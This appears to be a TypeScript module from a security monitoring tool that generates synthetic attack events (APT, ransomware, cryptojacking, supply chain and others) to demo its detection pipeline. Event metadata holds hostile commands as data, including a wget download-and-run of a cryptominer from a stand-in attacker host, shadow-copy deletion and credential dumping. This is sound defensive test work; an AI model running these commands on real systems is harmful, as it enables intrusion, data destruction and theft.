import { randomBytes } from 'crypto';
import { prisma } from '@utils/prisma';
import { logger } from '@utils/logger';
import { ingestEvents, type IngestEventInput } from './eventIngestion';
import { incidentService } from './incidentService';

export interface DemoScenarioResult {
  name: string;
  ingested: number;
  alertsCreated: number;
}

export interface DemoAttackResult {
  ingested: number;
  duplicates: number;
  alertsCreated: number;
  iocMatches: number;
  incidentsCreated: number;
  scenarios: DemoScenarioResult[];
}

function ts(dt: Date): string {
  return dt.toISOString().replace('+00:00', 'Z');
}

function minutesAgo(base: Date, minutes: number, secondsOffset = 0): string {
  return ts(new Date(base.getTime() - minutes * 60 * 1000 + secondsOffset * 1000));
}

function makeEvent(
  timestamp: string,
  eventType: string,
  severity: string,
  sourceIp: string,
  destIp: string | null,
  username: string | null,
  metadata: Record<string, any>
): IngestEventInput {
  return {
    timestamp,
    eventType,
    severity,
    sourceIp,
    destIp,
    username,
    metadata,
  };
}

function buildScenarios(now: Date): Array<{ name: string; events: IngestEventInput[] }> {
  // Scenario 1: APT Campaign
  const aptCampaign: IngestEventInput[] = [];
  for (let i = 0; i < 3; i++) {
    aptCampaign.push(makeEvent(
      minutesAgo(now, 45, i * 2),
      'email_received', 'MEDIUM',
      '203.0.113.150', '10.0.0.50', 'hr.manager@company.com',
      { attachmentType: 'malicious_macro', sender: 'it-support@vendor-services.com', subject: 'Invoice_2024_Q4.docm' }
    ));
  }
  for (let i = 0; i < 8; i++) {
    aptCampaign.push(makeEvent(
      minutesAgo(now, 35, i * 2), 'ssh_failed_login', 'HIGH',
      '203.0.113.99', '10.0.0.5', 'root',
      { attempts: i + 1, port: 22, protocol: 'ssh' }
    ));
  }
  for (let i = 0; i < 2; i++) {
    aptCampaign.push(makeEvent(
      minutesAgo(now, 25, i * 2), 'ssh_success_login', 'INFO',
      '203.0.113.99', '10.0.0.5', 'root',
      { sessionId: 'ssh-session-' + i, protocol: 'ssh' }
    ));
  }
  for (let i = 0; i < 2; i++) {
    aptCampaign.push(makeEvent(
      minutesAgo(now, 18, i * 3), 'credential_dump', 'CRITICAL',
      '10.0.0.5', null, 'SYSTEM',
      { tool: 'mimikatz', target: 'lsass.exe', dumpPath: 'C:\\Windows\\Temp\\dump.bin' }
    ));
  }
  for (let i = 0; i < 4; i++) {
    aptCampaign.push(makeEvent(
      minutesAgo(now, 15, i * 2), 'account_enumeration', 'LOW',
      '10.0.0.5', '10.0.0.10', 'root',
      { method: 'net user /domain', domain: 'corp.local', count: 250 + Math.floor(Math.random() * 50) }
    ));
  }
  aptCampaign.push(makeEvent(
    minutesAgo(now, 12), 'network_scan', 'MEDIUM',
    '10.0.0.5', '10.0.0.0/24', 'root',
    { method: 'arp-scan', subnet: '10.0.0.0/24', hostsFound: 47 }
  ));
  for (let i = 0; i < 4; i++) {
    aptCampaign.push(makeEvent(
      minutesAgo(now, 8, i * 3), 'smb_session_created', 'HIGH',
      '10.0.0.5', '10.0.0.' + (20 + i), 'root',
      { service: 'SMB', target: 'ADMIN$', method: 'psexec', lateralMove: true }
    ));
  }
  for (let i = 0; i < 3; i++) {
    aptCampaign.push(makeEvent(
      minutesAgo(now, 6, i * 2), 'file_collection', 'HIGH',
      '10.0.0.22', null, 'root',
      { paths: ['C:\\Users\\Admin\\Documents', 'C:\\Users\\Admin\\Desktop', 'D:\\Projects'][i], sizeMb: 150 + Math.floor(Math.random() * 200), fileCount: 500 + Math.floor(Math.random() * 200) }
    ));
  }
  for (let i = 0; i < 4; i++) {
    aptCampaign.push(makeEvent(
      minutesAgo(now, 2, i * 1), 'data_exfiltration', 'CRITICAL',
      '10.0.0.5', '198.51.100.200', 'SYSTEM',
      { channel: 'C2_HTTP', dataSizeMb: 200 + Math.floor(Math.random() * 300), destination: 'c2.apt29.example.com', protocol: 'HTTPS' }
    ));
  }
  for (let i = 0; i < 2; i++) {
    aptCampaign.push(makeEvent(
      minutesAgo(now, 1, i), 'log_cleared', 'HIGH',
      '10.0.0.5', null, 'SYSTEM',
      { logType: 'Security', method: 'wevtutil', logName: 'Security' }
    ));
  }

  // Scenario 2: Ransomware Campaign
  const ransomwareCampaign: IngestEventInput[] = [];
  for (let i = 0; i < 2; i++) {
    ransomwareCampaign.push(makeEvent(
      minutesAgo(now, 60, i * 5), 'web_exploit_attempt', 'HIGH',
      '198.51.100.200', '10.0.0.80', null,
      { vulnerability: 'CVE-2023-23397', exploitType: 'RCE', targetApp: 'Exchange Server', payloadSize: 4096 }
    ));
  }
  for (let i = 0; i < 2; i++) {
    ransomwareCampaign.push(makeEvent(
      minutesAgo(now, 45, i * 5), 'privilege_escalation_attempt', 'CRITICAL',
      '10.0.0.100', null, 'svc_backup',
      { vulnerability: 'CVE-2023-23397', target: 'SYSTEM', exploit: 'privilege_escalation' }
    ));
  }
  for (let i = 0; i < 2; i++) {
    ransomwareCampaign.push(makeEvent(
      minutesAgo(now, 30, i * 5), 'scheduled_task_created', 'MEDIUM',
      '10.0.0.100', null, 'SYSTEM',
      { taskName: 'WindowsDefenderUpdate', trigger: 'logon', action: 'C:\\Windows\\Temp\\payload.exe' }
    ));
  }
  for (let i = 0; i < 2; i++) {
    ransomwareCampaign.push(makeEvent(
      minutesAgo(now, 20, i * 3), 'log_cleared', 'HIGH',
      '10.0.0.50', null, 'SYSTEM',
      { logType: 'Security', method: 'wevtutil', logName: 'Security' }
    ));
  }
  for (let i = 0; i < 6; i++) {
    ransomwareCampaign.push(makeEvent(
      minutesAgo(now, 10, i * 2), 'ransomware_encryption', 'CRITICAL',
      '10.0.0.50', null, 'SYSTEM',
      { variant: 'LockBit 3.0', filesEncrypted: 5000 + Math.floor(Math.random() * 5000), extension: '.lockbit', ransomNote: 'README_LOCKBIT.txt' }
    ));
  }
  for (let i = 0; i < 2; i++) {
    ransomwareCampaign.push(makeEvent(
      minutesAgo(now, 5, i * 1), 'shadow_copy_deletion', 'CRITICAL',
      '10.0.0.50', null, 'SYSTEM',
      { method: 'vssadmin delete shadows', target: 'all', volume: 'C:' }
    ));
  }
  ransomwareCampaign.push(makeEvent(
    minutesAgo(now, 2), 'file_modification', 'CRITICAL',
    '10.0.0.50', null, 'SYSTEM',
    { filePath: 'C:\\README_LOCKBIT.txt', operation: 'create', content: 'YOUR FILES ARE ENCRYPTED... Contact us at...' }
  ));

  // Scenario 3: Insider Threat
  const insiderThreatCampaign: IngestEventInput[] = [];
  for (let i = 0; i < 2; i++) {
    insiderThreatCampaign.push(makeEvent(
      minutesAgo(now, 60, i * 30), 'account_enumeration', 'LOW',
      '10.0.0.150', '10.0.0.10', 'jane.doe@company.com',
      { method: 'ldap_query', filter: '(&(objectClass=user))', resultsCount: 1250 }
    ));
  }
  insiderThreatCampaign.push(makeEvent(
    minutesAgo(now, 45), 'system_info_query', 'LOW',
    '10.0.0.150', null, 'jane.doe@company.com',
    { query: 'systeminfo', fields: ['OS', 'Hotfixes', 'Network', 'Drives'] }
  ));
  for (let i = 0; i < 3; i++) {
    insiderThreatCampaign.push(makeEvent(
      minutesAgo(now, 30, i * 5), 'file_collection', 'HIGH',
      '10.0.0.150', null, 'jane.doe@company.com',
      { paths: ['C:\\Users\\jane.doe\\Documents', 'C:\\Users\\jane.doe\\Downloads', 'D:\\Projects'][i], sizeMb: 200 + Math.floor(Math.random() * 300), fileCount: 300 + Math.floor(Math.random() * 400) }
    ));
  }
  for (let i = 0; i < 2; i++) {
    insiderThreatCampaign.push(makeEvent(
      minutesAgo(now, 15, i * 5), 'network_share_access', 'HIGH',
      '10.0.0.150', '10.0.0.200', 'jane.doe@company.com',
      { share: '\\fileserver\\' + (i === 0 ? 'engineering' : 'finance'), filesAccessed: 50 + Math.floor(Math.random() * 100), bytesRead: 100 * 1024 * 1024 + Math.floor(Math.random() * 500 * 1024 * 1024) }
    ));
  }
  for (let i = 0; i < 4; i++) {
    insiderThreatCampaign.push(makeEvent(
      minutesAgo(now, 5, i * 1), 'exfiltration_dns', 'CRITICAL',
      '10.0.0.150', '8.8.8.8', 'jane.doe@company.com',
      { protocol: 'DNS', domain: 'exfil.attacker-controlled.com', dataSizeKb: 500 + Math.floor(Math.random() * 500), subdomains: 50 + Math.floor(Math.random() * 50) }
    ));
  }

  // Scenario 4: Credential Stuffing
  const credentialStuffingCampaign: IngestEventInput[] = [];
  for (let i = 0; i < 50; i++) {
    credentialStuffingCampaign.push(makeEvent(
      minutesAgo(now, 30, i * 0.5), 'vpn_login_attempt', 'MEDIUM',
      '198.51.100.' + Math.floor(Math.random() * 255), '10.0.0.100',
      'user' + Math.floor(Math.random() * 1000) + '@company.com',
      { service: 'VPN', authMethod: 'password', geoLocation: ['US', 'RU', 'CN', 'BR', 'IN'][Math.floor(Math.random() * 5)] }
    ));
  }
  for (let i = 0; i < 3; i++) {
    credentialStuffingCampaign.push(makeEvent(
      minutesAgo(now, 15, i * 2), 'vpn_login_success', 'INFO',
      ['198.51.100.45', '203.0.113.88', '192.0.2.120'][i], '10.0.0.100',
      ['john.smith@company.com', 'sarah.jones@company.com', 'mike.wilson@company.com'][i],
      { sessionId: 'vpn-session-' + i, mfaBypassed: true }
    ));
  }
  for (let i = 0; i < 2; i++) {
    credentialStuffingCampaign.push(makeEvent(
      minutesAgo(now, 10, i * 3), 'smb_session_created', 'HIGH',
      ['198.51.100.45', '203.0.113.88'][i], ['10.0.0.50', '10.0.0.55'][i],
      ['john.smith@company.com', 'sarah.jones@company.com'][i],
      { service: 'SMB', target: 'C$', lateralMove: true }
    ));
  }

  // Scenario 5: Cryptojacking
  const cryptojackingCampaign: IngestEventInput[] = [];
  cryptojackingCampaign.push(makeEvent(
    minutesAgo(now, 120), 'web_exploit_attempt', 'HIGH',
    '203.0.113.50', '10.0.0.200', null,
    { vulnerability: 'CVE-2023-4911', exploitType: 'privilege_escalation', targetApp: 'Linux Sudo' }
  ));
  for (let i = 0; i < 2; i++) {
    cryptojackingCampaign.push(makeEvent(
      minutesAgo(now, 90, i * 5), 'process_execution', 'HIGH',
      '10.0.0.150', null, 'SYSTEM',
      { interpreter: 'bash', command: 'wget http://attacker.com/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o pool.minexmr.com:4444 -u wallet' }
    ));
  }
  for (let i = 0; i < 2; i++) {
    cryptojackingCampaign.push(makeEvent(
      minutesAgo(now, 60, i * 5), 'scheduled_task_created', 'MEDIUM',
      '10.0.0.150', null, 'SYSTEM',
      { taskName: 'SystemHealthMonitor', trigger: 'boot', action: '/usr/bin/xmrig --config /etc/xmrig.json' }
    ));
  }
  for (let i = 0; i < 20; i++) {
    cryptojackingCampaign.push(makeEvent(
      minutesAgo(now, 50 - i * 2), 'cryptomining', 'HIGH',
      '10.0.0.150', 'pool.minexmr.com', 'SYSTEM',
      { miner: 'xmrig', cpuUsage: 85 + Math.floor(Math.random() * 10), memoryUsage: 4096, pool: 'pool.minexmr.com:4444', hashrate: 12000 + Math.floor(Math.random() * 5000) }
    ));
  }

  // Scenario 6: Supply Chain Compromise
  const supplyChainCampaign: IngestEventInput[] = [];
  supplyChainCampaign.push(makeEvent(
    minutesAgo(now, 240), 'supply_chain_compromise', 'CRITICAL',
    '198.51.113.200', '10.0.0.100', null,
    { vector: 'software_update', package: 'legit-package@2.4.1', maliciousFile: 'postinstall.js', c2: 'cdn.malicious-cdn.com' }
  ));
  for (let i = 0; i < 3; i++) {
    supplyChainCampaign.push(makeEvent(
      minutesAgo(now, 180, i * 30), 'process_execution', 'HIGH',
      '10.0.0.50', null, 'npm',
      { interpreter: 'node', command: 'npm install && node ./postinstall.js', parentProcess: 'npm' }
    ));
  }
  supplyChainCampaign.push(makeEvent(
    minutesAgo(now, 120), 'registry_modification', 'MEDIUM',
    '10.0.0.50', null, 'SYSTEM',
    { registryKey: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', valueName: 'SoftwareUpdate', valueData: 'C:\\Program Files\\LegitApp\\updater.exe' }
  ));
  for (let i = 0; i < 8; i++) {
    supplyChainCampaign.push(makeEvent(
      minutesAgo(now, 100 - i * 10), 'c2_http_beacon', 'CRITICAL',
      '10.0.0.50', '198.51.113.200', 'SYSTEM',
      { protocol: 'HTTP', domain: 'cdn.malicious-cdn.com', interval: 600, userAgent: 'LegitUpdater/2.4.1' }
    ));
  }
  for (let i = 0; i < 2; i++) {
    supplyChainCampaign.push(makeEvent(
      minutesAgo(now, 20, i * 5), 'file_collection', 'HIGH',
      '10.0.0.50', null, 'SYSTEM',
      { paths: ['C:\\Program Files\\LegitApp\\data', 'C:\\Users\\Public\\Documents'][i], sizeMb: 100 + Math.floor(Math.random() * 200) }
    ));
  }
  for (let i = 0; i < 2; i++) {
    supplyChainCampaign.push(makeEvent(
      minutesAgo(now, 5, i * 2), 'data_exfiltration', 'CRITICAL',
      '10.0.0.50', '198.51.113.200', 'SYSTEM',
      { channel: 'C2_HTTPS', dataSizeMb: 500 + Math.floor(Math.random() * 500), destination: 'cdn.malicious-cdn.com/exfil' }
    ));
  }

  // Scenario 7: Benign Background Noise
  const benignBackground: IngestEventInput[] = Array.from({ length: 30 }, (_, i) => ({
    timestamp: minutesAgo(now, 60 - i * 2),
    eventType: ['user_logon', 'http_request', 'dns_query', 'file_access', 'process_start'][i % 5],
    severity: 'INFO',
    sourceIp: '10.0.1.' + (10 + (i % 50)),
    destIp: i % 3 === 0 ? '10.0.0.' + (20 + (i % 30)) : null,
    username: 'user' + (i % 20),
    metadata: { count: Math.floor(Math.random() * 5) + 1 }
  }));

  // Scenario 8: Known IOC Traffic
  const iocTraffic: IngestEventInput[] = Array.from({ length: 8 }, (_, i) => {
    return makeEvent(
      minutesAgo(now, 15 - i * 2),
      'http_request', 'LOW',
      '192.168.100.50', '10.0.0.5', null,
      { url: 'http://malicious-c2-' + i + '.example.com/beacon', userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
    );
  });

  return [
    { name: 'APT Campaign (Phishing -> Credential Access -> Lateral -> Exfil)', events: aptCampaign },
    { name: 'Ransomware Campaign (Exploit -> Escalate -> Encrypt -> Ransom)', events: ransomwareCampaign },
    { name: 'Insider Threat (Recon -> Collection -> DNS Exfil)', events: insiderThreatCampaign },
    { name: 'Credential Stuffing (Mass Brute Force -> Lateral)', events: credentialStuffingCampaign },
    { name: 'Cryptojacking (Exploit -> Miner -> Persistence -> Mining)', events: cryptojackingCampaign },
    { name: 'Supply Chain Compromise (Update -> Beacon -> Exfil)', events: supplyChainCampaign },
    { name: 'Benign Background Noise', events: benignBackground },
    { name: 'Known IOC Traffic', events: iocTraffic },
  ];
}

/**
 * Runs a canned multi-scenario attack through the REAL ingestion pipeline
 * (persist -> IOC match -> rule detection -> alert + ML), then auto-groups
 * the resulting alerts into incidents. Used by the demo/test UI controls.
 */
export async function runDemoAttack(options: {
  ipAddress?: string;
  userId?: string | null;
} = {}): Promise<DemoAttackResult> {
  let source = await prisma.eventSource.findFirst({ where: { name: 'Demo Attack' } });
  if (!source) {
    source = await prisma.eventSource.create({
      data: {
        name: 'Demo Attack',
        apiKeyHash: randomBytes(32).toString('hex'),
        type: 'AGENT',
        description: 'Synthetic attack traffic generated from the UI demo controls',
        isActive: true,
      },
    });
  } else if (!source.isActive) {
    source = await prisma.eventSource.update({
      where: { id: source.id },
      data: { isActive: true },
    });
  }
  await prisma.eventSource.update({
    where: { id: source.id },
    data: { lastSeenAt: new Date() }
  });

  const now = new Date();
  const scenarios = buildScenarios(now);
  const results: DemoScenarioResult[] = [];

  let ingested = 0;
  let duplicates = 0;
  let alertsCreated = 0;
  let iocMatches = 0;

  for (const scenario of scenarios) {
    const result = await ingestEvents({
      sourceId: source.id,
      events: scenario.events,
      ipAddress: options.ipAddress,
      userId: options.userId ?? null
    });
    ingested += result.ingested;
    duplicates += result.duplicates;
    alertsCreated += result.alertsCreated.length;
    iocMatches += result.iocMatches;
    results.push({ name: scenario.name, ingested: result.ingested, alertsCreated: result.alertsCreated.length });
    logger.info({ scenario: scenario.name, ingested: result.ingested, alerts: result.alertsCreated.length }, 'Demo attack scenario complete');
  }

  const incidents = await incidentService(prisma).autoGroupAlerts({});

  return {
    ingested, duplicates, alertsCreated, iocMatches,
    incidentsCreated: incidents.length, scenarios: results
  };
}